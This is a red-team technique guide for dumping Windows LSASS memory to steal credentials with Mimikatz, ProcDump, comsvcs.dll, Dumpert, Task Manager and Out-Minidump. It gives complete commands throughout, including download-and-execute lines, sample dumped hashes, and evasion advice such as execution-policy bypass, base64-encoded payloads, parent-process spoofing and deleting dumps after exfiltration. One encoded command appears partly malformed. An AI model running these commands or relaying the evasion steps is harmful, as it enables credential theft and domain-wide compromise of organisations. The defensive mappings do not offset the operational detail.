# [CA-DUMP-001]: Mimikatz LSASS Memory Extraction

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-001 |
| **MITRE ATT&CK v18.1** | [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint (Server 2016-2025, Windows 10/11) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2014-6318 (RDP Audit Logging - Indirect Context) |
| **Technique Status** | **ACTIVE** (with version-specific mitigations) |
| **Last Verified** | 2026-01-02 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 10/11 all versions |
| **Patched In** | N/A - Technique continues to evolve; mitigations improve per version |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

**Note:** CVE-2014-6318 relates to RDP audit logging leakage (Microsoft Windows Vista SP2, 2008 SP2/R2 SP1, 7 SP1, 8, 8.1, Server 2008, 2012, 2012 R2), which indirectly relates to credential exposure in RDP sessions. However, Mimikatz LSASS dumping as a technique predates and supersedes this specific CVE. The primary attack (in-memory credential dumping via Mimikatz) remains ACTIVE across all modern Windows versions due to continuous bypass techniques against LSA Protection (RunAsPPL) and Credential Guard.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Mimikatz is an advanced post-exploitation tool that extracts plaintext passwords, password hashes, and Kerberos tickets directly from the Local Security Authority Subsystem Service (LSASS) process memory. LSASS stores session credentials in memory after a user logs in—including domain credentials, NTLM hashes, Kerberos TGTs, and SSO tokens. A threat actor with administrative or SYSTEM privileges can dump this process memory and extract all cached credentials, enabling lateral movement, credential theft, and privilege escalation. The attack leverages the `sekurlsa::logonpasswords` module in Mimikatz to enumerate and extract all active session credentials from LSASS memory in plaintext.

**Attack Surface:** LSASS.exe process memory, Windows authentication subsystem (Kerberos, NTLM, Digest, CredSSP), in-memory credential storage, and privileged process access controls.

**Business Impact:** **CRITICAL - Network-Wide Lateral Movement and Domain Takeover.** Successful LSASS credential dumping compromises domain administrator credentials, service account passwords, and user plaintext passwords. An attacker can then use these credentials to:
- Perform **Pass-the-Hash (PtH)** or **Pass-the-Ticket (PtT)** attacks against all domain-joined systems.
- Impersonate high-privilege accounts to access sensitive data repositories, email systems, and financial applications.
- Establish persistent backdoors on critical infrastructure.
- Escalate from lateral access to full domain compromise within minutes.

In enterprise environments, a single successful LSASS dump can lead to organization-wide breach, ransomware deployment, and regulatory non-compliance (GDPR, HIPAA, SOC2).

**Technical Context:** LSASS dumping typically requires:
- **Local Administrator or SYSTEM privileges** (can be obtained via UAC bypass, privilege escalation, or RDP/WinRM compromise).
- **5-30 seconds of execution time** (depending on method).
- **Detection risk: HIGH** if LSA Protection (RunAsPPL) is enabled; **MEDIUM-LOW** if Credential Guard is active; **VERY HIGH** if no mitigations are in place.
- **Success indicators:** Presence of `.dmp` files in %TEMP% or %WINDIR% directories; suspicious parent processes (rundll32.exe, taskmgr.exe, procdump.exe) accessing LSASS; CommandLine artifacts containing "MiniDump," "sekurlsa," or "Invoke-Mimikatz."

### Operational Risk

- **Execution Risk:** **CRITICAL** - No rollback possible. Extracted credentials remain compromised indefinitely unless all affected passwords are reset and Kerberos tickets invalidated. One successful dump = organization-wide credential compromise.
- **Stealth:** **LOW** (without mitigations) to **HIGH** (with LSA Protection + Credential Guard + EDR). Generates 50-200+ Windows Event IDs (4656, 4663, 4688, 4689, Sysmon 10). LOLBin variants (rundll32.exe, comsvcs.dll, rdrleakdiag.exe) reduce signature-based detection but remain detectable via behavioral analysis.
- **Reversibility:** **NO** - Credentials cannot be "uncompromised." Mitigation requires immediate domain-wide password resets, ticket invalidation, and forensic investigation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.13 (LSA Protection), 5.3 (Account Policies), 18.9 (Credential Guard) | Failure to enable LSA Protection and Credential Guard leaves LSASS vulnerable to memory dumping attacks. |
| **DISA STIG** | WN10-CC-000005 (Credential Guard), WN10-SO-000265 (RunAsPPL) | Windows security configuration requires hardening of credential storage and protection. |
| **CISA SCuBA** | WindowsDefender.3 (Endpoint Protection) | Credential dumping prevention through Advanced Threat Protection. |
| **NIST 800-53** | AC-3 (Access Enforcement), SC-7 (Boundary Protection), IA-5 (Password Management), SC-28 (Protection of Information at Rest) | Access controls must prevent unauthorized process memory access; credentials must be protected in storage and transit. |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Loss of personal data via credential compromise requires breach notification within 72 hours. |
| **DORA** | Art. 9 (Protection and Prevention), Art. 18 (ICT Security Testing) | EU financial institutions must implement ICT security testing and incident detection for credential protection. |
| **NIS2** | Art. 21 (Cyber Risk Management Measures), Art. 23 (Incident Reporting) | Critical infrastructure operators must implement multi-layered defenses against credential theft and report incidents. |
| **ISO 27001** | A.9.2.3 (Management of Privileged Access Rights), A.12.3.1 (Event Logging), A.12.4.1 (Event Logging Activation) | Control of privileged accounts and comprehensive event logging required. |
| **ISO 27005** | "Compromise of Administration Interface" Risk Scenario | Memory dumping is a direct path to administrative interface compromise and lateral movement. |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** 
- **Minimum:** Local Administrator or SYSTEM privileges (administrative token required to open LSASS with `PROCESS_QUERY_INFORMATION` and `PROCESS_VM_READ` access).
- **Realistic Path:** Initial compromise (RDP, WinRM, AppLocker bypass) → UAC bypass (token hijacking, privilege escalation exploit) → local admin → LSASS dump.

**Required Access:**
- **Local:** Direct process access to `lsass.exe`; ability to create files in writable directories (%TEMP%, %WINDIR%\Temp).
- **Network:** Not required for local dumps; may require SMB/RDP for remote execution via lateral movement.

**Supported Versions:**

| Windows Version | Mimikatz Support | PPL Protection | Credential Guard | Viability |
|---|---|---|---|---|
| **Server 2016** | ✅ Full | Optional | Optional | ✅ HIGHLY VULNERABLE |
| **Server 2019** | ✅ Full | Optional | Optional | ✅ HIGHLY VULNERABLE |
| **Server 2022** | ✅ Full | Increasingly enabled | Optional | ⚠️ PARTIALLY VULNERABLE (depends on config) |
| **Server 2025** | ✅ Full | Default (enterprise-joined) | Default (enterprise-joined) | ⚠️ MITIGATED (with defaults) |
| **Windows 10 (all builds)** | ✅ Full | Varies | Varies | ⚠️ DEPENDS ON CONFIG |
| **Windows 11 22H2+** | ✅ Full | Default (enterprise-joined) | Default (enterprise-joined) | ⚠️ MITIGATED (with defaults) |

**PowerShell Version:** 5.0+ (for `Invoke-Mimikatz` and Out-Minidump.ps1 attacks).

**Tools:**
- [Mimikatz (v2.2.0+)](https://github.com/gentilkiwi/mimikatz) - Latest versions bypass modern protections.
- [Sysinternals ProcDump (v10.0+)](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) - Native Windows dump tool.
- [Dumpert (Outflank)](https://github.com/outflanknl/Dumpert) - Direct syscalls + API unhooking.
- [NanoDump](https://github.com/helpsystems/nanodump) - Syscalls + invalid dump signature bypass.
- [pypykatz](https://github.com/skelsec/pypykatz) - Python-based offline Mimikatz analysis.
- [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) - T1003.001 test cases.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Check If LSASS Dumping Is Viable (LSA Protection Status)

**Objective:** Determine if LSA Protection (RunAsPPL) is enabled, which blocks traditional user-mode LSASS dumps. If disabled or running at integrity level 1 (UEFI lock not enforced), the technique is viable.

#### PowerShell Reconnaissance

```powershell
# Check LSA Protection (RunAsPPL) Status
$runasppl = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -ErrorAction SilentlyContinue
if ($runasppl.RunAsPPL -eq 0 -or $null -eq $runasppl) {
    Write-Host "[+] LSA Protection DISABLED - LSASS dump is VIABLE" -ForegroundColor Green
} elseif ($runasppl.RunAsPPL -eq 1) {
    Write-Host "[!] LSA Protection ENABLED (no UEFI lock) - Mitigated but bypasses possible" -ForegroundColor Yellow
} elseif ($runasppl.RunAsPPL -eq 2) {
    Write-Host "[-] LSA Protection ENABLED with UEFI lock - Strongly mitigated" -ForegroundColor Red
}

# Check Credential Guard (IsolatedUserMode)
$credguard = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name Enabled -ErrorAction SilentlyContinue
if ($credguard.Enabled -eq 1) {
    Write-Host "[-] Credential Guard ENABLED - Additional mitigation layer" -ForegroundColor Red
} else {
    Write-Host "[+] Credential Guard DISABLED - LSASS plaintext passwords available" -ForegroundColor Green
}

# Check WDigest plaintext passwords in memory (often disabled on Server 2012+)
$wdigest = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -ErrorAction SilentlyContinue
if ($wdigest.UseLogonCredential -eq 1) {
    Write-Host "[+] WDigest plaintext passwords ENABLED - Additional credentials available" -ForegroundColor Green
} else {
    Write-Host "[-] WDigest plaintext passwords DISABLED (default Server 2012+)" -ForegroundColor Cyan
}

# Identify Windows version
$osversion = [System.Environment]::OSVersion.Version
Write-Host "[*] Windows Version: $osversion"
```

**What to Look For:**
- If `RunAsPPL = 0` or not present: ✅ LSASS dump is straightforward.
- If `RunAsPPL = 1`: ⚠️ Dump succeeds but requires mimidrv.sys driver injection or API unhooking techniques.
- If `RunAsPPL = 2`: ❌ Dump requires kernel-level exploits or alternative techniques.
- If `Credential Guard = 1`: ❌ Plaintext passwords are isolated; hashes available but plaintext passwords blocked.
- If `WDigest = 1`: ✅ Additional plaintext passwords available in LSASS.

#### Version Note

**Server 2016-2019:** RunAsPPL defaults to **0 (disabled)**. Dumps succeed immediately.

**Server 2022+:** RunAsPPL defaults to **1 (enabled, no UEFI lock)** on some builds. Dumps still succeed but may trigger alerts.

**Server 2025 (Enterprise-joined):** RunAsPPL defaults to **2 (UEFI lock)** and Credential Guard **enabled by default**. Requires advanced bypass techniques.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Mimikatz Direct LSASS Dump (Interactive)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. Most reliable against unpatched systems with RunAsPPL = 0.

#### Step 1: Obtain Administrator Access
**Objective:** Ensure you are running with Local Administrator or SYSTEM privileges.

**Command (PowerShell):**
```powershell
# Check current privilege level
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, User
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
$isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Is Admin: $isAdmin"
```

**Expected Output:**
```
Is Admin: True
```

**What This Means:**
- If `True`: Proceed to Step 2. You have sufficient privileges.
- If `False`: Exploit UAC bypass or privilege escalation before proceeding.

**OpSec & Evasion:**
- If running unprivileged, use UAC bypass techniques (Token Hijacking via DLL injection, `fodhelper.exe`, `compmgmt.msc`, etc.).
- Ensure parent process is benign (e.g., cmd.exe, powershell.exe, explorer.exe) not directly suspicious (rundll32.exe with unusual parameters).
- Detection likelihood: **MEDIUM** (elevation attempts are logged in Event ID 4672, 4673).

#### Step 2: Download and Execute Mimikatz
**Objective:** Download the latest Mimikatz binary and execute the `sekurlsa::logonpasswords` module.

**Command (PowerShell - Download via IEX):**
```powershell
# Download Mimikatz from GitHub and execute in memory
$mimikatzURL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
IEX (New-Object Net.WebClient).DownloadString($mimikatzURL)
Invoke-Mimikatz -DumpCreds
```

**Expected Output:**
```
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb  3 2025 23:58:42 +0000
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin Delpy `gentilkiwi`
 '## v ##'   https://blog.gentilkiwi.com/mimikatz
  '#####.                             (UID=500)

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 1/2/2026 6:30:00 AM
SID               : S-1-5-18
	msv :	
	 [00000003] Primary
	 * Username : WIN-SERVER$
	 * Domain   : EXAMPLE
	 * NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
	 * SHA1     : x9y8z7a6b5c4d3e2f1g0h9i8j7k6l5m4n3o2p1q0

[+] Dumped all cached credentials (hashes and plaintext passwords).
```

**What This Means:**
- Each logon session is enumerated with its credentials.
- `Username`: Service account or domain user account.
- `Domain`: Domain of the account (WORKGROUP for local accounts, EXAMPLE for domain accounts).
- `NTLM`: MD4 hash of password (used for PtH attacks).
- `SHA1`: Hash of credential data.
- **Plaintext passwords only appear if WDigest is enabled** (likely on older Server 2012 R2 or if explicitly enabled).

**OpSec & Evasion:**
- **Detection likelihood: VERY HIGH** - Mimikatz is a known threat; PowerShell execution policy may block download.
- **Evasion:**
  - Use `Bypass` execution policy: `powershell -ExecutionPolicy Bypass -Command "..."`
  - Load Mimikatz from disk instead of memory if PowerShell download is blocked.
  - Use obfuscated Invoke-Mimikatz variants (e.g., Invoke-Mimikatz with renamed functions).
  - Execute via parent process spoofing (e.g., rundll32.exe).

**Troubleshooting:**

| Error | Cause | Fix (Server 2016) | Fix (Server 2019) | Fix (Server 2022) | Fix (Server 2025) |
|---|---|---|---|---|---|
| "ERROR kuhl_m_sekurlsa_acquireLSA" | Not running as admin | Re-run as admin | Re-run as admin | Re-run as admin | Re-run as admin |
| "Protected Process Light (PPL) enabled" | RunAsPPL = 1 | Use mimidrv.sys injection | Use mimidrv.sys injection | Use mimidrv.sys or Dumpert | Kernel exploit required |
| "Credential Guard enabled" | IsolatedUserMode = 1 | Plaintext unavailable (hashes still stolen) | Plaintext unavailable (hashes still stolen) | Plaintext unavailable (hashes still stolen) | Plaintext unavailable (hashes still stolen) |
| "No logon sessions found" | LSASS has minimal sessions | Normal on minimal systems; wait for user login | Normal on minimal systems; wait for user login | Normal on minimal systems; wait for user login | Normal on minimal systems; wait for user login |

**References & Proofs:**
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [PowerSploit Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)
- [Red Canary Mimikatz Detection](https://redcanary.com/threat-detection-report/threats/mimikatz/)

---

### METHOD 2: ProcDump (Native Windows Tool)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. Legitimate tool; often bypasses policy blocks but leaves file artifacts.

#### Step 1: Download ProcDump (if not present)
**Objective:** Obtain the Sysinternals ProcDump executable.

**Command (PowerShell):**
```powershell
# Download ProcDump from Microsoft Sysinternals
$procDumpURL = "https://download.sysinternals.com/files/Procdump.zip"
$outputPath = "C:\Windows\Temp\Procdump.zip"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $procDumpURL -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath "C:\Windows\Temp\Procdump" -Force
```

**Expected Output:**
```
Directory: C:\Windows\Temp\Procdump
    Procdump.exe
    Procdump64.exe
    Eula.txt
    ...
```

**Version Note:** Both 32-bit (Procdump.exe) and 64-bit (Procdump64.exe) versions exist. Use Procdump64.exe on 64-bit systems for better reliability.

#### Step 2: Dump LSASS Memory to File
**Objective:** Create a memory dump of LSASS.exe and save to disk.

**Command (Command Prompt - Admin):**
```cmd
C:\Windows\Temp\Procdump\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
```

**Command (PowerShell - Admin):**
```powershell
C:\Windows\Temp\Procdump\procdump64.exe -accepteula -ma lsass.exe "C:\Windows\Temp\lsass_dump.dmp"
```

**Expected Output:**
```
ProcDump v10.0 - Process dump utility
Copyright (C) 2009-2021 Mark Russinovich
Sysinternals - www.microsoft.com/sysinternals

[06:35:12] Dump 1 initiated: C:\Windows\Temp\lsass_dump.dmp
[06:35:13] Dump 1 complete: 45 MB written in 1.2 seconds
[06:35:13] Dump count reached.
```

**What This Means:**
- `-accepteula`: Accepts Microsoft EULA (required for automation).
- `-ma`: Full dump (not mini-dump). Includes all memory pages for maximum credential recovery.
- File size: typically 50-200 MB (larger on systems with many user sessions).

**OpSec & Evasion:**
- **Detection likelihood: HIGH** - File creation on disk is detected by YARA, hash-based detection, and behavioral analysis.
- **Evasion:**
  - Dump to alternate location (UNC path, hidden folder, alternate data stream): `C:\Windows\Temp\lsass_dump.dmp:zone.identifier`
  - Compress dump immediately and delete original: `7z a -y dump.7z lsass_dump.dmp && del lsass_dump.dmp`
  - Use mini-dump (`-mm` flag) instead of full dump to reduce file size and detection likelihood.

**Troubleshooting:**

| Error | Cause | Fix (Server 2016) | Fix (Server 2019-2025) |
|---|---|---|---|
| "Cannot open process" (Access Denied) | Not running as admin | Run Command Prompt as Administrator | Run Command Prompt as Administrator |
| "Process not found" | LSASS PID changed | Retry; LSASS PID is stable unless system crashes | Retry; LSASS PID is stable unless system crashes |
| "Dump failed - PPL enabled" | RunAsPPL = 1 or 2 | Not applicable (Server 2016 has RunAsPPL = 0) | Use alternative method (Dumpert, NanoDump) |

**Command (Server 2016-2019 Variant):**
```cmd
procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

**Command (Server 2022+ with RunAsPPL):**
```cmd
REM Standard dump may fail. Use -r flag to retry or Dumpert for direct syscalls
procdump64.exe -accepteula -ma -r lsass.exe C:\Windows\Temp\lsass.dmp
REM If above fails, proceed to METHOD 3 (Dumpert)
```

**References & Proofs:**
- [Microsoft Sysinternals ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)
- [Atomic Red Team T1003.001 #1](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-1---dump-lsassexe-memory-using-procdump)

---

### METHOD 3: rundll32.exe + comsvcs.dll (LOLBin - No Binary Download)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. Built-in binary; no download required. Bypasses many application whitelisting policies.

#### Step 1: Identify LSASS Process ID
**Objective:** Obtain the LSASS.exe Process ID (PID).

**Command (PowerShell):**
```powershell
$lsassPID = (Get-Process -Name lsass).Id
Write-Host "LSASS PID: $lsassPID"
```

**Expected Output:**
```
LSASS PID: 456
```

**Command (Command Prompt):**
```cmd
tasklist /FI "IMAGENAME eq lsass.exe"
REM Output: lsass.exe                     456
```

**What This Means:**
- LSASS PID is typically a small number (300-800) and remains stable throughout system uptime.

#### Step 2: Dump LSASS Using comsvcs.dll MiniDump Function
**Objective:** Use the built-in `comsvcs.dll` MiniDump export to dump LSASS.exe memory to disk.

**Command (PowerShell - Admin):**
```powershell
$lsassPID = (Get-Process -Name lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsassPID "C:\Windows\Temp\lsass.dmp" full
```

**Command (Command Prompt - Admin):**
```cmd
for /f "tokens=2" %i in ('tasklist /FI "IMAGENAME eq lsass.exe" ^| find /c "lsass"') do (
  tasklist /FI "IMAGENAME eq lsass.exe" | find "lsass.exe" | for /f "tokens=2" %j in ('findstr lsass') do (
    rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %j "C:\Windows\Temp\lsass.dmp" full
  )
)

REM Or simpler (if you know the PID, e.g., 456):
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 456 "C:\Windows\Temp\lsass.dmp" full
```

**Expected Output:**
```
[Process successfully dumped to C:\Windows\Temp\lsass.dmp]
```

**What This Means:**
- `comsvcs.dll` is a COM+ Services library included in all Windows versions.
- `MiniDump` function creates a process dump (equivalent to ProcDump -mm flag).
- File size: typically 30-100 MB (smaller than full dump).

**OpSec & Evasion:**
- **Detection likelihood: MEDIUM** - rundll32.exe with unusual parameters is suspicious; however, legitimate applications also use this DLL.
- **Evasion:**
  - Use alternate living-off-the-land tools (werfault.exe, rdrleakdiag.exe) instead of rundll32.exe.
  - Rename comsvcs.dll or copy to alternate location.
  - Use encoded PowerShell command: `powershell -enc [base64_encoded_command]`

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Ordinal 16 not found" | Incorrect comsvcs.dll version | Use full path: C:\Windows\System32\comsvcs.dll (not SysWOW64) |
| "MiniDump: Access Denied" | Not running as admin | Run PowerShell/CMD as Administrator |
| "Process not found" | Incorrect PID | Re-run `tasklist /FI "IMAGENAME eq lsass.exe"` to verify PID |
| "Output file write failed" | C:\Windows\Temp not writable | Use alternate location (C:\temp, C:\ProgramData) or UNC path |

**Command (Server 2022+ Variant with RunAsPPL):**
```powershell
REM This may fail silently if PPL is enabled
REM Error: "Unable to read memory from target process" (silent failure)
REM Solution: Use METHOD 4 (Dumpert/Direct Syscalls) for Server 2022+
$lsassPID = (Get-Process -Name lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsassPID "C:\Windows\Temp\lsass.dmp" full
REM Check if file exists and has size > 1 MB
If ((Get-Item "C:\Windows\Temp\lsass.dmp" -ErrorAction SilentlyContinue).Length -gt 1MB) {
    Write-Host "[+] Dump successful"
} Else {
    Write-Host "[-] Dump failed - PPL likely enabled. Try Dumpert or NanoDump."
}
```

**References & Proofs:**
- [Atomic Red Team T1003.001 #2 (comsvcs.dll)](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-2---dump-lsassexe-memory-using-comsvcsdll)
- [Microsoft Windows API: MiniDumpWriteDump](https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)

---

### METHOD 4: Dumpert (Direct Syscalls + API Unhooking)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. Bypasses PPL and many EDR hooks by using direct syscalls instead of hooked Windows APIs.

#### Step 1: Download Dumpert Executable
**Objective:** Obtain Dumpert binary from Outflank GitHub.

**Command (PowerShell):**
```powershell
$dumpertURL = "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe"
$outputPath = "C:\Windows\Temp\Dumpert.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $dumpertURL -OutFile $outputPath
```

**Expected Output:**
```
C:\Windows\Temp\Dumpert.exe (Size: ~50-100 KB)
```

#### Step 2: Execute Dumpert to Dump LSASS
**Objective:** Run Dumpert, which automatically detects LSASS and dumps memory using direct syscalls.

**Command (Command Prompt - Admin):**
```cmd
C:\Windows\Temp\Dumpert.exe
```

**Expected Output:**
```
Outflank-Dumpert v1.0 (https://github.com/clr2of8)
[*] Dumping LSASS...
[*] Creating minidump...
[+] Successfully dumped lsass.exe to: C:\Windows\Temp\dumpert.dmp
```

**What This Means:**
- `dumpert.dmp` is created in the current directory (typically C:\Windows\Temp if running as admin).
- No file path argument needed; Dumpert auto-selects output location.
- Direct syscalls bypass EDR hooks on hooked APIs (e.g., CreateFileW, ReadProcessMemory).

**OpSec & Evasion:**
- **Detection likelihood: LOW-MEDIUM** - Syscalls are harder to intercept than API calls, but behavioral analysis can still detect memory access patterns.
- **Evasion:**
  - Combine with UAC bypass to avoid running from obvious admin context.
  - Execute from parent process (e.g., rundll32.exe) using process herpaderping or svchost.exe mimicry.
  - Delete dumped file immediately after exfiltration.

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Access Denied" | Not running as admin | Run Command Prompt as Administrator |
| "Failed to open LSASS" | PPL with UEFI lock (RunAsPPL = 2) | Dumpert still works; if not, try NanoDump or kernel exploit |
| "Invalid PE header" | Corrupted binary | Re-download Dumpert from GitHub |
| ".dmp file not created" | Invalid directory permissions | Run from C:\ProgramData or explicit writable path |

**Command (Server 2022+ Variant):**
```cmd
REM Dumpert is specifically designed for PPL bypass
C:\Windows\Temp\Dumpert.exe
REM Should succeed even with RunAsPPL = 1 or 2
REM Output: "Successfully dumped lsass.exe to: C:\Windows\Temp\dumpert.dmp"
```

**References & Proofs:**
- [Outflank Dumpert GitHub](https://github.com/outflanknl/Dumpert)
- [Blog: Dumpert - Dumping Process Memory with Direct Syscalls](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)
- [Atomic Red Team T1003.001 #3](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-3---dump-lsassexe-memory-using-direct-system-calls-and-api-unhooking)

---

### METHOD 5: Task Manager GUI (No CLI Required)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. No command-line execution; GUI-based approach.

#### Step 1: Open Task Manager
**Objective:** Launch Task Manager with administrative privileges.

**GUI Steps:**
1. Press `CTRL + ALT + DEL` or right-click taskbar → **Task Manager**.
2. If prompted for UAC, click **Yes** to run as Administrator.
3. If LSASS is not visible, click **Details** tab (top menu) → **Show processes from all users** (checkbox, bottom left).

**Alternative (PowerShell):**
```powershell
taskmgr.exe
```

#### Step 2: Locate LSASS.exe and Dump Memory
**GUI Steps:**
1. In Task Manager, scroll down to **lsass.exe** (under System processes if showing all users).
2. Right-click **lsass.exe** → **Create dump file**.
3. A dialog appears: "The memory dump was saved to: `C:\Users\[YourUsername]\AppData\Local\Temp\lsass.dmp`."
4. Navigate to the file location to confirm.

**Expected Output:**
```
C:\Users\Administrator\AppData\Local\Temp\lsass.dmp (Size: 50-200 MB)
```

**What This Means:**
- Task Manager uses the same MiniDumpWriteDump API as ProcDump and comsvcs.dll.
- Dump file is automatically named `lsass.dmp` and placed in user's local temp.

**OpSec & Evasion:**
- **Detection likelihood: VERY HIGH** - GUI interaction is visible to user monitoring and screen capture tools; file creation is logged.
- **Evasion:**
  - Not recommended for stealth; best used in physical compromise or secure location.
  - Perform immediately after admin access to reduce dwell time.
  - Compress and exfiltrate immediately.

**Troubleshooting:**

| Issue | Cause | Fix |
|---|---|---|
| "lsass.exe not visible" | Not showing all processes | Click **Details** → **Show processes from all users** |
| "Create dump file option missing" | Old Task Manager version | Update Windows to latest version |
| "Memory dump failed" | PPL enabled (cannot dump from GUI) | Dump still succeeds; if not, use Command Prompt method |
| "Permission denied writing to temp" | Temp folder not writable | Run Task Manager as Administrator |

**References & Proofs:**
- [Microsoft Task Manager Documentation](https://support.microsoft.com/en-us/windows/using-task-manager-c3e39d4f-f6ea-b48a-b9b0-46d90f7bf4e5)
- [Red Canary LSASS Detection](https://redcanary.com/threat-detection-report/techniques/lsass-memory/)

---

### METHOD 6: PowerShell Out-Minidump.ps1 (Pure PowerShell, No Binaries)

**Supported Versions:** Windows Server 2016-2025, Windows 10/11 all builds. Pure PowerShell implementation; no external binaries required.

#### Step 1: Download and Load Out-Minidump Script
**Objective:** Load PowerShell function that wraps MiniDumpWriteDump API.

**Command (PowerShell - Admin):**
```powershell
# Download Out-Minidump.ps1 from Atomic Red Team
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$scriptURL = "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1"
IEX (New-Object Net.WebClient).DownloadString($scriptURL)
```

**Expected Output:**
```
[Script loaded successfully]
```

#### Step 2: Dump LSASS Using Out-Minidump
**Objective:** Call Out-Minidump function against LSASS process.

**Command (PowerShell - Admin):**
```powershell
Get-Process -Name lsass | Out-Minidump
```

**Expected Output:**
```
[+] Dumping lsass (PID: 456)
[+] Dump written to: C:\Users\Administrator\AppData\Local\Temp\lsass_456.dmp
```

**What This Means:**
- Output file is named `lsass_[PID].dmp` in user's local temp directory.
- Function automatically handles MiniDumpWriteDump API invocation and error handling.

**OpSec & Evasion:**
- **Detection likelihood: MEDIUM-HIGH** - PowerShell execution is logged in Windows Event Log (if `ScriptBlockLogging` enabled); however, IEX (Invoke-Expression) can be obfuscated.
- **Evasion:**
  - Use PowerShell execution policy bypass: `powershell -ExecutionPolicy Bypass`
  - Obfuscate IEX command: `powershell -enc [base64_encoded_command]`
  - Use alternate file to bypass IEX detection: download script to disk, then dot-source: `. C:\Windows\Temp\Out-Minidump.ps1`

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "IEX: The term 'Out-Minidump' is not recognized" | Script not downloaded | Re-run IEX command or download manually to disk |
| "MiniDumpWriteDump failed" | PPL enabled and PowerShell-based API call blocked | Use Dumpert or NanoDump instead |
| "Access Denied" | Not running as admin | Run PowerShell as Administrator |
| "Get-Process: Cannot find process 'lsass'" | LSASS process not found (rare) | Verify LSASS is running: `Get-Process -Name lsass` |

**Command (Server 2022+ Variant - Obfuscated):**
```powershell
REM Base64-encoded version to evade detection:
powershell -NoProfile -ExecutionPolicy Bypass -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGplAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACdAaHR0cHM6Ly9naXRodWIuY29tL3JlZGNhbmFyeWNvL2F0b21pYy1yZWQtdGVhbS9yYXcvbWFzdGVyL2F0b21pY3MvVDEwMDMuMDAxL3NyYy9PdXQtTWluaWR1bXAucHMxJwApOwpHZXQtUHJvY2VzcyAtTmFtZSBsc2FzcyB8IE91dC1NaW5pZHVtcA=="
```

**References & Proofs:**
- [Out-Minidump.ps1 - Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/src/Out-Minidump.ps1)
- [Author: Matthew Graeber (@mattifestation)](https://twitter.com/mattifestation)
